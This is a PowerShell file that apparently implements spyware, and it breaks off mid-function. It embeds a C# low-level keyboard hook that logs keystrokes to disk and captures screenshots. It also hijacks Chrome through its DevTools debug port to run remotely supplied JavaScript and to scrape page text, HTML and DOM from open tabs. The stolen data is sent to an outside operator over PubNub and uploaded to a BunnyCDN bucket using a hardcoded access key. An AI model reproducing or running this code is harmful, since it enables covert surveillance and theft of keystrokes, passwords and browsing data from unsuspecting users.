# 20261018-1847
# https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub

# Emulation.setFocusEmulationEnabled
# Wait-Debugger

Add-Type -AssemblyName System.Web
Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)

$scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
# $createdNew = $false
# $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)

#if (-not $createdNew) {
    #Write-Error "An instance of this script is already running. Exiting."
    #exit 1
#}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# 20260925-1432

# note: keeps running even after terminal closed down
Add-Type -TypeDefinition '
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerShell {
public class KeyLogger
{
    public static string filePath = @"C:\\ProgramData\\owdkeyboardlog.txt"; // Use the full path
    public static StringBuilder sb = new StringBuilder("", 80);
    
    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    // Delegate for the hook procedure
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Required for the message loop
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX; public int ptY; }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        int vkCode = -1;

        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
        {
            vkCode = Marshal.ReadInt32(lParam);
            // Console.WriteLine($"Key Pressed: {(System.Windows.Forms.Keys)vkCode}"); // Requires System.Windows.Forms
            sb.Append("[");
            sb.Append(String.Format("{0}", (System.Windows.Forms.Keys) vkCode));
            sb.Append("]");
        }

        if ( ( ( (System.Windows.Forms.Keys) vkCode ) == System.Windows.Forms.Keys.Enter ) || ( sb.Length >= 15 ) ) {
            string result = sb.ToString();
            System.IO.File.AppendAllText(filePath, result + Environment.NewLine);
            sb.Clear();
            sb.Length = 0;
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public static void Main()
    {
        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);

        // Message loop to keep the hook active
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) { }

        UnhookWindowsHookEx(_hookID);
    }
}
}
' -ReferencedAssemblies System.Windows.Forms

function Get-Identity {
    $ScriptName = "pscdp.relay.ps1"

    $ComputerName = $env:COMPUTERNAME
    
    $UserName = $env:USERNAME
    
    return "$ScriptName|$ComputerName|$UserName|PowerShell-$PSVersionTable"
}

$script:identitykvpstr = Get-Identity | ConvertTo-Json

$script:logger_logmsg_i = 0
function Log-Msg {
    param([object]$Msg)

    $caller = (Get-PSCallStack)[0].FunctionName

    if ( (Get-PSCallStack).length -gt 1 ) {
        $caller = (Get-PSCallStack)[1].FunctionName
    }

    $script:logger_logmsg_i++

    if ( $_ -is [System.Exception] -or $_ -is [System.Management.Automation.ErrorRecord]) {
        Write-Host "caller: $caller" 
        Write-Error $_.Exception.Message
        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
    } else {
        Write-Host "$caller|$script:logger_logmsg_i|$Msg" -ForegroundColor Cyan
    }
}

function Get-Timestamp {
    $ret = Get-Date -Format "HH:mm:ss.fff"
    return $ret
}

function Take-Screenshot() {
    $memoryStream = New-Object System.IO.MemoryStream

    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen

    $name = (( $screen.DeviceName -replace '\\', '' ) -replace '\.', '')

    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top

    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        
    $graphic.Dispose()
    $bitmap.Dispose()

    $base64String = [Convert]::ToBase64String($memoryStream.ToArray())

    return $base64String
}

function Get-FrontendUrls() {
    return $script:clientws.GetTargets()
}

function Get-KeyboardLog() {
    $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw

    return $text
}

class PSCDPCommandException : System.Exception {
    PSCDPCommandException([string]$message) : base($message) {}
}

class PSCDPCommand {
    [string]$name # TODO refactor and remove as it is not actually used anywhere

    [string]$sessionId

    [int32]$id
    [string]$method
    [hashtable]$params

    [PSCDPResult]$response
    
    [scriptblock]$callback
    [bool]$isinvoked = $false

    [bool]$iserror = $false

    [bool]$isbroadcast = $false
    [bool]$isbrowserversion = $false
    [bool]$ispbping = $false

    [object]$sendTask = $null
    [object]$taskresult = $null

    [hashtable]$builtincmd = $null

    [string]$targetid = $null
    [PSCDPTarget]$target = $null

    [bool]HasCallback() {
        return ( $null -ne $this.callback )
    }

    static [PSCDPCommand] Create([hashtable]$obj) {
        $out = [PSCDPCommand]::new()
        
        $out.name = $obj.name
        $out.id = $obj.id
        $out.method = $obj.method
        $out.params = $obj.params
        $out.response = $obj.response
        $out.sessionId = $obj.sessionId
        
        $out.callback = $obj.callback
        $out.isinvoked = $obj.isinvoked

        $out.iserror = $obj.iserror

        $out.isbroadcast = $obj.isbroadcast
        $out.isbrowserversion = $obj.isbrowserversion
        $out.ispbping = $obj.ispbping

        $out.targetid = $obj.targetid
        $out.target = $obj.target

        if ( $obj.builtincmd -is [pscustomobject] ) {
            $ht = Transform-PSCustomObject($obj.builtincmd)
        } elseif ( $obj.builtincmd -is [hashtable] ) {
            $ht = $obj.builtincmd
        } else {
            $ht = [hashtable]$null
        }

        $out.builtincmd = $ht

        return $out
    }

    [hashtable]GetHashtable() {

        $isexec = $false
        $execstatus = "UNKNOWN"

        if ( $null -ne $this.taskresult -and $null -ne $this.sendTask ) {
            $isexec = $true
            $execstatus = [string]$this.sendTask.Status
        }

        $obj = @{
            name=$this.name
            id=$this.id
            method=$this.method
            params=$this.params
            sessionId=$this.sessionId
            #callback=$this.callback
            isinvoked=$this.isinvoked
            iserror=$this.iserror
            isbroadcast=$this.isbroadcast
            isbrowserversion=$this.isbrowserversion
            ispbping=$this.ispbping
            isexec=$isexec
            execstatus=$execstatus
            builtincmd=$this.builtincmd
        }

        $obj['hascallback']=$false

        if ( $null -ne $this.callback ) {
            $obj['hascallback']=$true
        }

        if ( $null -ne $this.target ) {
            $obj['targetid']=$this.target.targetId
        } elseif ( $null -ne $this.targetid ) {
            $obj['targetid'] = $this.targetid
        } else {
            $obj['targetid']=$null
        }

        $obj['response'] = $null

        if ( $null -ne $this.response ) {
            $obj['response'] = $this.response.GetHashtable()
        }

        return $obj
    }

    [hashtable] GetDict() {

        if ( [string]::IsNullOrWhiteSpace($this.method) ) {
            throw [PSCDPCommandException]::new('method is missing')
        }

        $obj = @{
            id=$this.id
            method=$this.method
        }

        if ( $null -ne $this.params ) {
            $obj.Add('params', $this.params)
        }

        if ( $null -ne $this.target ) {
            $this.sessionId = $this.target.sessionId
        }

        if ( ! [string]::IsNullOrWhiteSpace($this.sessionId) ) {
            $obj.Add('sessionId', $this.sessionId)
        }

        return $obj
    }

    [string] ToJSON() {
        $obj = $this.GetDict() 
        $jsonstr = $obj | ConvertTo-Json -Depth 10 -Compress
        return $jsonstr
    }
}

enum PSCDPCommandErrorType {
    JavaScriptError
    CDPError
    GeneralError
    NoError
    TransformError
    ExceptionError

    <# CDPError
    {
        "id": 1,
        "error": {
            "code": -32602,
            "message": "Invalid parameters",
            "data": "Some missing parameter details"
        }
    }
    #>

    <# JavaScriptError
        {
            "id": 1,
            "result": {
                "result": {
                    "type": "object",
                    "subtype": "error",
                    "className": "TypeError",
                    "description": "TypeError: Cannot read properties of null (reading 'subtype')",
                    "objectId": "-6633390234293888361.1.1"
                },
                "exceptionDetails": {
                    "exceptionId": 1,
                    "text": "Uncaught",
                    "lineNumber": 0,
                    "columnNumber": 14,
                    "scriptId": "12",
                    "url": "",
                    "exception": {
                        "type": "object",
                        "subtype": "error",
                        "className": "TypeError",
                        "description": "TypeError: Cannot read properties of null (reading 'subtype')",
                        "objectId": "-6633390234293888361.1.2"
                    }
                }
            }
        }
    #>
}

class PSCDPResult {

    [int32]$id = -1
    [hashtable]$result = @{}
    [PSCDPCommand]$cmd = $null

    [bool]$iserror = $false
    [PSCDPCommandErrorType]$errorType = [PSCDPCommandErrorType]::NoError

    static [PSCDPCommandErrorType] GetErrorType([hashtable]$msght) {

        try {

            if ( $msght.ContainsKey('error') ) {
                return [PSCDPCommandErrorType]::CDPError
            }
    
            if ( ! [string]::IsNullOrEmpty($msght.result.exceptionDetails.exceptionId) ) {
                return [PSCDPCommandErrorType]::JavaScriptError
            }

            if ( $msght.ContainsKey('result') ) {
                return [PSCDPCommandErrorType]::NoError
            }

            # CDP event notifications
            if ( $msght.ContainsKey('method') ) {
                return [PSCDPCommandErrorType]::NoError
            }
    
        } catch {
            return [PSCDPCommandErrorType]::ExceptionError
        }

        return [PSCDPCommandErrorType]::GeneralError
    }
    
    static [PSCDPResult] Create([hashtable]$msght) {
        [PSCDPResult]$obj = [PSCDPResult]::new()

        $terrorType = [PSCDPResult]::GetErrorType($msght)

        $obj.id = $msght['id']

        $tresult = $msght['result']

        $obj.result = @{}

        if ( ( ! ($null -eq $tresult ) ) -and ( $tresult -is [pscustomobject] ) ) {
            $obj.result = Transform-PSCustomObject($tresult)
        }

        $obj.errorType = $terrorType
        $obj.iserror = $true

        if ( $terrorType -eq [PSCDPCommandErrorType]::NoError ) {
            $obj.iserror = $false
        }

        return $obj
    }

    [hashtable] GetHashtable() {
        $obj = $this.result # check if response is error, if so parse error and
                            # return error object

        return $obj
    }

    [string] GetResultStr() {

        $resultstr = ""

        try {
            $resultstr = $this.result | ConvertTo-Json -Depth 10
        } catch {
            
        }

        return $resultstr
    }
}

class PSCDPTarget {
    [string]$title
    [string]$url
    [string]$targetId
    [string]$type
    [string]$description
    [string]$devtoolsFrontendUrl
    [string]$webSocketDebuggerUrl
    [string]$faviconUrl
    [bool]$attached
    [bool]$canAccessOpener
    [string]$browserContextId
    # [string]$pid # TODO fix this is reserved keyword in powershell
    [int32]$executionContextId = -1 # needed to execute Runtime.callFunctionOn 
    
    [string]$sessionId

    [byte[]]$pngBytes

    # set when result arrives with success
    $addbinding_ts = $null              # set before call  to addBinding
    $addbinding_ts_ok = $null           # set after call  to addBinding
    $addbinding_ok = $false             # Runtime.addBinding
    $runtime_enable_ok = $false         # Runtime.enable
    $emulation_enable_ok = $false       # Emulation.setFocusEmulationEnabled

    [hashtable] GetDict() {
        $ht = @{
            title=$this.title
            url=$this.url
            targetId=$this.targetId
            type=$this.type
            description=$this.description
            devtoolsFrontendUrl=$this.devtoolsFrontendUrl
            webSocketDebuggerUrl=$this.webSocketDebuggerUrl
            faviconUrl=$this.faviconUrl
            attached=$this.attached
            canAccessOpener=$this.canAccessOpener
            browserContextId=$this.browserContextId
            sessionId=$this.sessionId
            executionContextId=$this.executionContextId
            runtime_enable_ok=$this.runtime_enable_ok
            addbinding_ok=$this.addbinding_ok
            emulation_enable_ok=$this.emulation_enable_ok
        }

        return $ht
    }

    [string] GetScreenshot() {
        # convert pngBytes to base64 string
        return $null
    }

    static [PSCDPTarget] Create([PSCustomObject]$obj) {
        $ht = @{
            title=$obj.title
            url=$obj.url
            targetId=$obj.targetId
            type=$obj.type
            description=$obj.description
            devtoolsFrontendUrl=$obj.devtoolsFrontendUrl
            webSocketDebuggerUrl=$obj.webSocketDebuggerUrl
            faviconUrl=$obj.faviconUrl
            attached=$obj.attached
            canAccessOpener=$obj.canAccessOpener
            browserContextId=$obj.browserContextId
            sessionId=$obj.sessionId
        }

        return [PSCDPTarget]$ht
    }
}

$script:pingpbtarget_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )
   
    $cdpobj.pbpingresponses.Add( $Response )

    if ( $Response.iserror ) {
        $cdpobj.pbpingerrors.Add( $Response )
        return
    } 

    $cdpobj.pbpingcheck = 0
}

$script:browserversion_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cdpobj.browserversion = $Response.result

    $cdpobj.versionresponses.Add($Response)

    if ( $Response.iserror ) {
        $cdpobj.versionerrors.Add( $Response )
        return
    }

    $cdpobj.versionchecksn = 0
}

$script:runtime_enable_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $target = $Response.cmd.target

    $target.runtime_enable_ok = $true
}

$script:SendPBMessage_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )
    
}

$script:runtime_evaluate_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

}

$script:runtime_addBinding_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $target = $Response.cmd.target

    if ( ! $Response.cmd.iserror ) {
        $target.addbinding_ok = $true
        $target.addbinding_ts_ok = Get-Date
    }
}

$script:emulation_enable_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $target = $Response.cmd.target

    $target.emulation_enable_ok = $true
}

# TODO: upload to bunny and send back download link
$script:captureScreenshot_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd
    $target = $Response.cmd.target

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$cmd.targetid
    }

    try {
        $imagedata=$Response.result.data

        $chunkSize = 512
        $imagelength = $imagedata.length
        $chunkcount = [int] ( $imagelength / $chunkSize )
        $remainderlength = $imagelength % $chunkSize

        $chunks = [System.Collections.Generic.List[string]]::new()

        $tchunkcount = $chunkcount

        if ( $remainderlength -gt 0 ) {
            $tchunkcount = $chunkcount - 1
        }

        for ($i = 0; $i -lt $tchunkcount; $i++ ) {
            $substr = ""
            try {
                $substr = $imagedata.Substring( $i*$chunkSize, $chunkSize )
            } catch {
                Log-Msg $_
            }

            $chunks.Add( $substr )
        }

        if ( $remainderlength -gt 0 ) {
            $chunks.Add( $imagedata.Substring( ($chunkcount-1)*$chunkSize ) )
        }

        if ( $null -eq $chunks -or $chunks.length -le 0 ) {
            Log-Msg "pass"
        }

        for ($i = 0; $i -lt $chunks.Count; $i++ ) {

            $result = @{ imagedata="" }
            $result['imagedata'] = $chunks[$i]

            $resultout['result'] = $result

            $resultout['ts']=$(Get-Timestamp)

            $resultout['chunkcount'] = $chunkcount
            $resultout['chunksize'] = $chunksize
            $resultout['chunkindex'] = $i
            $resultout['remainderlength'] = $remainderlength
            
            $script:pubnubws.SendPBMessage($resultout)
        }
    } catch {
        Log-Msg $_
    }

}

# TODO implement logic to refresh targets list
$script:getTargets_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$Response.cmd.target.targetId
    }

    $resultout['result'] = $Response.result.targetInfos

    $script:pubnubws.SendPBMessage($resultout)
}

$script:evaluate_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$Response.cmd.target.targetId
    }

    $resltstr = $Response.GetResultStr()
    
    if ( $null -eq $resltstr ) {
        $resltstr=""
    }

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($resltstr)
    $base64str = [Convert]::ToBase64String($bytes)

    $resultout['result'] = $base64str

    $script:pubnubws.SendPBMessage($resultout)
}

$script:GetTargetHTML_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$target.targetId
    }

    $resltstr = $Response.result.result.value
    
    if ( [string]::IsNullOrEmpty($resltstr) ) {
        $resltstr=""
    }

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($resltstr)
    # $base64str = [Convert]::ToBase64String($bytes)
    
    $fid = [string]( Get-Random -Minimum 10000000 -Maximum 100000000 )
    $fname = "GetTargetHTML_" + $fid + ".txt"
    $response = Upload-Bunny $bytes $fname

    $response = $response | ConvertFrom-Json -AsHashtable

    # TODO check if response status is ok, etc.

    $resultout['result'] = ${ 
        url="https://testdev2829pull.b-cdn.net/$fname"
        response=$response
    }

    $script:pubnubws.SendPBMessage($resultout)
}

$script:getdom_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    $obj = $Response.result.root

    $result = ProcessDOMObj($obj)

    if ( $null -eq $result ) {
        $result = @{} # TODO insert error flag
    }

    $cmd = $Response.cmd.builtincmd

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
        targetId=$Response.cmd.target.targetId
    }

    $jsonstr = $result | ConvertTo-Json -Depth 10 # TODO might not be adequate -- 

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonstr)
    $base64str = [Convert]::ToBase64String($bytes)

    $resultout['result'] = $base64str

    $script:pubnubws.SendPBMessage($resultout)

    # DOM.querySelector
    # DOM.getOuterHTML
    # DOM.describeNode
    # DOM.resolveNode
    
}

$script:BroadcastMsg_callback = {
    param(
        [PSCDPResult]$Response, [PSCDP]$cdpobj
    )

    if ( ! $Response.cmd.isbroadcast ) {
        # TODO throw error -- wrong callback specified
        return
    }

    $cdpobj.broadcastresponses.Add($Response)
    
    if ( $Response.iserror ) {
        $cdpobj.broadcasterrors.Add($Response)
    } else {
        $cdpobj.broadcastcheck = 0
    }

}

function ProcessDOMObj {
    param([PSCustomObject]$obj)

    $result = @{}

    try {
        $sresult = Transform-PSCustomObject($obj)

        $keys = @("backendNodeId", "nodeType", "nodeName","documentURL","baseURL")        
        $keys.ForEach({ $result[$_] = $sresult[$_] })

        $sattributes = $sresult['attributes']
        $attributes = @{}

        if ( $null -ne $sattributes -and $sattributes -is [array] ) {
            
            $key = $null

            for ( $i = 0; $i -lt $sattributes.Length; $i++ ) {
                $value = $sattributes[$i]

                if ($i % 2 -eq 0) {
                    $key = $value
                } else {
                    $attributes.Add($key, $value)
                }

            }

            if ( $null -ne $attributes -and $attributes.Count -gt 0 ) {
                $result.Add('attributes', $attributes)
            }

        }

        $schildren = $sresult['children']

        if ( $null -ne $schildren -and $schildren -is [array] ) {
            
            $children = [hashtable[]]::new($schildren.Length)

            for ( $i = 0; $i -lt $schildren.Length; $i++ ) {
                $childobj = $schildren[$i]

                $child = ProcessDOMObj($childobj)

                $children[$i] = $child
            }

            $result.Add('children', $children)
        }


    } catch {
        Log-Msg $_ # TODO convert exception to hashtable and return
        return $null
    }

    return $result
}

# TODO refactor to use pubnubws to upload instead of direct HTTP request
#      make javascript POST call (no need to write pb message)
function Upload-Bunny {
    param (
        [byte[]]$bytes,
        [string]$fname
    )


    $uri = "https://ny.storage.bunnycdn.com/testdev2829/$fname"

    $headers = @{
        "AccessKey"     = "814e8500-65b3-41a9-a638a74ec57d-911b-4a20"
        "User-Agent"    = "python-requests/2.32.3"
        "Content-Type"  = "application/octet-stream"
    }
    
    try {
        $response = Invoke-WebRequest -Uri $uri -Method Put -Body $bytes -Headers $headers -UseBasicParsing
    } catch {
        Log-Msg $_
    }
    
    return $response
}

function Transform-PSCustomObject($obj) {
    $ht = @{}

    try {
        $obj.psobject.Properties | ForEach-Object {
            $ht[$_.Name] = $_.Value
        }
    } catch {
        $ht = $null
    }
    
    return $ht;
}

# TODO implement capability execute arbitrary CDP commands
#      master enters CDP commands in UI tooling, etc.
function Exec-CDP {
    param($cmd)

    Log-Msg "pass"
}

function ChunkBytes {
    [OutputType([hashtable])]
    param([string]$imagedata, [int32]$chunkSize = 512)

    $chunks = [System.Collections.Generic.List[string]]::new()

    $resultout = @{}

    $resultout['chunksize'] = $chunkSize
    $resultout['chunks'] = $chunks
    $resultout['chunkcount'] = -1
    $resultout['remainderlength'] = -1

    if ( [string]::IsNullOrEmpty($imagedata) ) {
        return $resultout
    }

    $imagelength = $imagedata.length
    $chunkcount = [int] ( $imagelength / $chunkSize )
    $remainderlength = $imagelength % $chunkSize

    $tchunkcount = $chunkcount

    if ( $remainderlength -gt 0 ) {
        $tchunkcount = $chunkcount - 1
    }

    for ($i = 0; $i -lt $tchunkcount; $i++ ) {
        $substr = ""
        $substr = $imagedata.Substring( $i*$chunkSize, $chunkSize )

        $chunks.Add( $substr )
    }

    if ( $remainderlength -gt 0 ) {
        $chunks.Add( $imagedata.Substring( ($chunkcount-1)*$chunkSize ) )
    }

    $resultout['chunks'] = $chunks    
    $resultout['remainderlength'] = $remainderlength
    $resultout['chunkcount'] = $chunkcount

    return $resultout
}


# http GET/POST requests to chrome cdp
function Process-CDP {
    param($cmd)

    $devurl = $cmd.url

    if ( [string]::IsNullOrEmpty($devurl) ) {
        return $null
    }

    $ret = @{}

    $uri = [uri]$devurl
    $params = [System.Web.HttpUtility]::ParseQueryString($uri.Query)

    $httpres = Invoke-WebRequest -Method Get -Uri $devurl -ErrorAction Stop -UseBasicParsing

    # TODO check $httpres.StatusCode
    # handle errors gracefully
    
    $byteArray = $httpres.RawContentStream.ToArray()

    if ( $params.AllKeys.Contains("testchunking") ) {
        $byteArray = $byteArray + (, [byte]0 * 16384)
    }

    $bodystr = [System.Convert]::ToBase64String($byteArray)

    $ret = @{
        headers=$httpres.Headers
        body=$null
        requesturl=$devurl
        ischunked=$false
        chunkobj=$null
        statuscode=$httpres.StatusCode
    }

    if ( $bodystr.Length -ge 16384 ) {
        $chunkobj = ChunkBytes $bodystr
        $ret['chunkobj'] = $chunkobj
        $ret['ischunked'] = $true
    } else {
        $ret['body'] = $bodystr
    }

    return $ret
}

function Send-ChunkedResult {
    param([hashtable]$result, [hashtable]$resultout)

    $chunkobj = $result['chunkobj']
    $chunks = $chunkobj['chunks']
    $chunkcount = [int32]$chunks.Count

    $tresult = @{
        chunksize = $chunkobj['chunksize']
        chunkcount = $chunkobj['chunkcount']
        remainderlength = $chunkobj['remainderlength']
        imagedata = $null
        chunkindex = -1
    }

    for ( $i=0; $i -lt $chunkcount; $i++ ) {

        $tresult['imagedata'] = $chunks[$i]
        $tresult['chunkindex'] = $i

        if ( $i -eq 0 ) {
            $tresult['requesturl'] = $result['requesturl']
            $tresult['statuscode'] = $result['statuscode']
            $tresult['headers'] = $result['headers']
        }

        $resultout['result'] = $tresult

        $script:pubnubws.SendPBMessage($resultout)
    }

}

function Process-BuiltInCommand {
    param([hashtable]$cmd)

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
    }

    if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
        $result = Get-FrontendUrls
    } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
        $result = Process-CDP($cmd)

        $ischunked = $result['ischunked']

        if ( $ischunked ) {
            Send-ChunkedResult($result, $resultout)
            return
        }

    } elseif ( $cmd.builtincmd -eq "ExecCDPCommand" ) {
        $result = Exec-CDP($cmd)
    } elseif ( $cmd.builtincmd -eq "GetTargets" ) {
        $targets = $script:clientws.targets

        $ttargets = $targets | ForEach-Object { $_.GetDict() }

        $result = $ttargets
    } elseif ( $cmd.builtincmd -eq "RefreshTargets" ) {

        $script:clientws.AddQueue( @{ 
            method="Target.getTargets"; 
            params=@{ filter=@( @{ type="page"; exclude=$false } ) } 
            callback=$script:getTargets_callback
            builtincmd=$cmd
        } ) 
        
        return
    } elseif ( $cmd.builtincmd -eq "GetTargetScreenCapture" ) {
        $targetId = $cmd.targetId

        $target = $script:clientws.GetTarget($targetId)

        $pbmsg = @{ 
            method="Page.captureScreenshot"; 
            params=@{ 
                format="png"
                quality=100
                fromSurface=$true
                captureBeyondViewport=$true
            }; 
            target=$target; 
            callback=$script:captureScreenshot_callback;
            builtincmd=$cmd
        }

        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "GetTargetText" ) {
        
        $pbmsg = @{ 
            method="Runtime.evaluate"; 
            params=@{ 
                expression="document.body.innerText"
                returnByValue=$true
            }; 
            target=$target; 
            callback=$script:evaluate_callback;
            builtincmd=$cmd
        }

        $script:clientws.AddQueue( $pbmsg )
        
        return

    } elseif ( $cmd.builtincmd -eq "ExecEvaluate" ) {

        $targetid = $cmd.targetid
        $target = $script:clientws.GetTarget($targetid)

        $expression = $cmd.expression
        $expression = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($expression))

        $params = @{
            expression=$expression
            returnByValue=$true
        }

        if ( $null -ne $target -and $target.executionContextId -ge 0 ) {
            $params.Add('contextId',$target.executionContextId)
        }

        $pbmsg = @{ 
            method="Runtime.evaluate"; 
            params=$params
            targetid=$targetid;
            builtincmd=$cmd;
            callback=$script:evaluate_callback
        }

        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "GetTargetHTML" ) {

        $pbmsg = @{ 
            method="Runtime.evaluate"; 
            params=@{ 
                expression="document.documentElement.outerHTML"
                returnByValue=$true
            }; 
            target=$target;
            builtincmd=$cmd;
            callback=$script:GetTargetHTML_callback
        }

        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "SendTestMessage" ) {
        $result = "message received -- $(Get-Timestamp)"
    } elseif ( $cmd.builtincmd -eq "GetClientCommands" ) {

        $result = $script:clientws.commands | ForEach-Object { 
            $_.GetHashtable()
        }
        
    } elseif ( $cmd.builtincmd -eq "LoadQueue" ) {

        $targetid = $cmd.targetid
        
        $target = $script:clientws.GetTarget($targetid)

        $script:clientws.LoadQueue($target)

        return

    } elseif ( $cmd.builtincmd -eq "RefreshDOM" ) {

        $targetid = $cmd.targetid
        
        $pbmsg = @{ 
            method="DOM.getDocument";
            params = @{
              depth=1;
              pierce=$true;
            };
            targetid=$targetid;
            builtincmd=$cmd;
            callback=$script:getdom_callback
          }
          
        $script:clientws.AddQueue( $pbmsg )

        return
    } elseif ( $cmd.builtincmd -eq "GetScreenshot" ) {
        throw 'fatal error: not implemented'
    } elseif ( $cmd.builtincmd -eq "GetKeyboardLog" ) {
        throw 'fatal error: not implemented'
    } elseif ( $cmd.builtincmd -eq "GetCDPVersion" ) { 
        
        $script:clientws.AddQueue( @{ 
            method="Browser.getVersion"; 
            params=@{} 
            #callback=
            builtincmd=$cmd
        } ) 

        return
    } else {
        throw "unsupported command [$($cmd.builtincmd)]"
    }

    $resultout['result'] = $result

    $script:pubnubws.SendPBMessage($resultout)
}

# NOTE only supports pb messages with builtincmd payload
function Process-PubNubEvent {

    param([string]$Message)

    try {
        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.

        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
            return
        } elseif ( $payload.type -eq "PubNubStatus" ) {
            return
        } elseif ( ! ( $payload.message.destination -eq "pscdp.relay.ps1" ) ) {
            return
        }

    } catch {

    }

    try {
        if ( [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
            return
        }
    } catch {
        return
    }

    $cmd = $null

    $cmd = $payload.message

    if ( $null -ne $cmd ) {
        $cmd = Transform-PSCustomObject($cmd)
        Process-BuiltInCommand($cmd)
    }

}

function Ping-DebugPort {
    param($debugport)

    try {
        $targets = Invoke-RestMethod -Uri "http://localhost:$debugport/json" -ErrorAction Stop
    } catch [System.Net.WebException] {
        Log-Msg "[R5P9]: $($_.Exception.Message)"
        return $null
    }        


    # $targets | Select-Object title, id, webSocketDebuggerUrl
    $targets = $targets | Where-Object { $_.type -eq "page" }

    return $targets
}

function Find-ActiveClientBrowser {
    # should return debug port (9222 or 9223) and browser name
